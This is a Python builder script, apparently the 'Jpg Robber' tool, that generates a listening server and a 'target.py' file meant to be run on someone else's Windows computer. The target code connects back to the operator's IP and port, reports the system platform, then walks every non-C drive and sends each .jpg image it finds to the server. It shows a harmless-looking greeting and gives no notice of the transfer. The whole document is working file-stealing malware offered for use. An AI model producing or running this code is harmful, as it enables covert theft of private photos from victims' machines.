import sys

server_code = """import socket
import pyfiglet
  
welcome = pyfiglet.figlet_format("Jpg Robber")
print(welcome)
print("Programmed by Amir Noori")
print("Script On Github : https://github.com/AmireNoori/Jpg-Robber")
con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def transfering(addr, count):
    filefamily = addr + str(count)
    print(filefamily)
    with open(filefamily + ".jpg", 'wb') as filename:
        while True:
            data = client.recv(1024)
            client.send(b'1')
            filename.write(data)
            if not data:
                break
            if str(data.decode(errors='ignore')) == 'end':
                client.send(b'1')
                break
    print('Successfully get the file')

while True:
    IP = "{}"
    PORT = {}
    try:
        con.bind((IP, PORT))
        break
    except:
        print("your ip is useless")

con.listen(2)
print("Activated successfully")
print("Wait to target connection...")
client, addr = con.accept()
print("Connected to " + str(addr))
info = client.recv(1024)
info1 = str(info.decode("utf-8"))
print(info1)
client.send(b'1')
count = 0
while True:
    count += 1
    info2 = client.recv(1024)
    info3 = str(info2.decode(errors='ignore'))
    if 'start' in info3:
        client.send(b'1')
        transfering(str(addr), count)

"""



target_code = """import socket
import platform
import os
import string
from ctypes import windll

def get_drives():
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drives.append(letter)
        bitmask >>= 1

    return drives

print("Welcome To The Neo")
con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Please wait...")
while True:
    IP = "{}"
    PORT = {}
    try:
        con.connect((IP, PORT))
        break
    except:
        continue
  
print("Connected successfully")
device = platform.platform()
info = str(device)
info2 = bytes(info, 'utf_8')
con.sendall(info2)
con.recv(1024)

drivenames = get_drives()
if 'C' in drivenames:
    drivenames.remove('C')
for drive in drivenames:
    for root, dirs, files in os.walk(drive + '{}'):
        for file in files:
            if file.endswith(".jpg"):
                con.send(b'start')
                con.recv(1024)
                try:
                    filepath = os.path.join(root, file)
                    with open(filepath, 'rb') as data:
                        while True:
                            chunk = data.read(8192)  # Adjust chunk size as per your requirement
                            if not chunk:
                                break
                            con.send(chunk)
                            con.recv(1024)
                    con.send(b'end')
                    con.recv(1024)
                except Exception as e:
                    print("error")
"""

def main():
    # Check if the correct number of parameters is provided
    if len(sys.argv) == 2 and sys.argv[1] in ['-h', '-help']:
        # Display help commands
        print("Help:")
        print("Usage: python yourfile.py [Your server IPV4] [Your custom port]")
        print("Example: python robber.py 192.168.1.1 1234")
        print("Note: make sure that the port you enter can be used on your target system and your server")
        sys.exit(0)
    elif len(sys.argv) != 3:
        # Incorrect number of parameters provided
        print("Type python robber.py -h to know how to use")
        sys.exit(1)

    # Assign the parameter values to variables
    param1 = sys.argv[1]
    param2 = sys.argv[2]

    # Open the server file for writing
    with open("server.py", "w") as server:
        server.write(server_code.format(param1,param2))
        print("server.py created successfully in the path.\nRun it on your server")
    # Open the target file for writing
    with open("target.py", "w") as target:
        target.write(target_code.format(param1,param2,r":\\"))
        print("target.py created successfully in the path.\nRun it on the target system.")
if __name__ == "__main__":
    main()